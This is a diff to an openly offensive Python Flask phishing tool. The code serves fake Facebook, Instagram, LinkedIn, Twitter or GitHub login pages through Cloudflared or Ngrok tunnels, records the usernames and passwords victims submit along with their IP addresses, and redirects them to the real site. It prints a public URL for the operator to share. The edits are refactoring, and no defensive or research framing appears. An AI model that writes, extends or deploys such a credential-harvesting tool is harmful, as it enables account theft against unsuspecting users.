@@ -2,12 +2,11 @@ import os
 import subprocess
 import time
 import sys
-import platform
 import shutil
 from datetime import datetime
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template, redirect
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder="templates")
 
 # ASCII Banner
 def show_banner():
@@ -29,53 +28,51 @@ def log_session(ip, service):
     with open('sessions.log', 'a') as f:
         f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")
 
-# Detect OS and Termux
+# Detect Termux
 def is_termux():
     return "com.termux" in os.environ.get("PREFIX", "")
 
-# Install Cloudflared (Termux + Linux/macOS)
+# Install Cloudflared
 def install_cloudflared():
     try:
         if is_termux():
-            print("\n[+] Installing Cloudflared for Termux...")
             subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
         else:
-            print("\n[+] Installing Cloudflared for Linux/macOS...")
             url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
             subprocess.run(["wget", url, "-O", "cloudflared"], check=True)
             subprocess.run(["chmod", "+x", "cloudflared"], check=True)
             subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"], check=True)
         return True
     except Exception as e:
-        print(f"\n[!] Failed to install Cloudflared: {e}")
+        print(f"[!] Failed to install Cloudflared: {e}")
         return False
 
-# Start Cloudflared (with custom domain support)
+# Start Cloudflared tunnel
 def start_cloudflared(port=8080, custom_domain=None):
     tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
     if not tool_path:
-        print("\n[!] Cloudflared not found.")
-        if input("Install Cloudflared? (y/n): ").strip().lower() == "y":
+        if input("Install Cloudflared? (y/n): ").lower() == "y":
             if not install_cloudflared():
                 return None
             tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
         else:
             return None
 
+    cmd = [tool_path, "tunnel", "--url", f"http://localhost:{port}"]
+    if custom_domain:
+        cmd.extend(["--hostname", custom_domain])
+
     try:
-        cmd = [tool_path, "tunnel", "--url", f"http://localhost:{port}"]
-        if custom_domain:
-            cmd.extend(["--hostname", custom_domain])
         process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         time.sleep(5)
         for line in process.stderr:
             if "trycloudflare.com" in line or (custom_domain and custom_domain in line):
                 public_url = line.split("|")[-1].strip()
-                print(f"\n[+] Cloudflared tunnel active! Public URL: {public_url}")
+                print(f"[+] Public URL: {public_url}")
                 return public_url
         return None
     except Exception as e:
-        print(f"\n[!] Failed to start Cloudflared: {e}")
+        print(f"[!] Cloudflared error: {e}")
         return None
 
 # Main setup
@@ -89,59 +86,48 @@ def setup():
     print("5. GitHub")
     choice = input("\nEnter choice (1-5): ").strip()
 
-    print("\n[+] Select Tunnel Service:")
+    print("\n[+] Select Tunnel:")
     print("1. Cloudflared (Recommended)")
     print("2. Ngrok")
-    tunnel_choice = input("\nEnter choice (1/2): ").strip()
-
-    # Custom domain (optional)
-    custom_domain = None
-    if tunnel_choice == "1" and input("Use custom domain? (y/n): ").strip().lower() == "y":
-        custom_domain = input("Enter custom domain (e.g., login.example.com): ").strip()
+    tunnel_choice = input("Enter choice (1/2): ").strip()
 
     # Start tunnel
     public_url = None
     if tunnel_choice == "1":
+        custom_domain = input("Custom domain (leave blank for default): ").strip() or None
         public_url = start_cloudflared(custom_domain=custom_domain)
     elif tunnel_choice == "2":
-        ngrok_token = input("\nNgrok Auth Token: ").strip()
-        public_url = start_ngrok(ngrok_token, custom_domain)
+        ngrok_token = input("Ngrok Auth Token: ").strip()
+        public_url = start_ngrok(ngrok_token)
     else:
-        print("\n[!] Invalid choice. Exiting.")
+        print("[!] Invalid choice.")
         sys.exit(1)
 
     if not public_url:
         sys.exit(1)
 
-    # Start Flask with selected phishing page
-    templates = {
-        "1": "facebook.html",
-        "2": "instagram.html",
-        "3": "linkedin.html",
-        "4": "twitter.html",
-        "5": "github.html"
-    }
-    redirects = {
-        "1": "https://facebook.com",
-        "2": "https://instagram.com",
-        "3": "https://linkedin.com",
-        "4": "https://twitter.com",
-        "5": "https://github.com"
+    # Configure Flask routes
+    services = {
+        "1": {"template": "facebook.html", "redirect": "https://facebook.com"},
+        "2": {"template": "instagram.html", "redirect": "https://instagram.com"},
+        "3": {"template": "linkedin.html", "redirect": "https://linkedin.com"},
+        "4": {"template": "twitter.html", "redirect": "https://twitter.com"},
+        "5": {"template": "github.html", "redirect": "https://github.com"}
     }
 
     @app.route('/')
     def home():
-        return render_template(templates[choice])
+        return render_template(services[choice]["template"])
 
     @app.route('/login', methods=['POST'])
     def login():
         username = request.form.get('email') or request.form.get('username')
         password = request.form.get('pass') or request.form.get('password')
-        log_credentials(username, password, list(templates.values())[int(choice)-1].replace('.html', ''))
-        return redirect(redirects[choice])
+        log_credentials(username, password, services[choice]["template"].replace('.html', ''))
+        return redirect(services[choice]["redirect"], code=302)
 
-    print(f"\n[+] Phishing page active! Share this URL: {public_url}")
+    print(f"\n[+] Phishing page active: {public_url}")
+    app.run(host='0.0.0.0', port=8080)
 
 if __name__ == '__main__':
     setup()
-    app.run(host='0.0.0.0', port=8080)
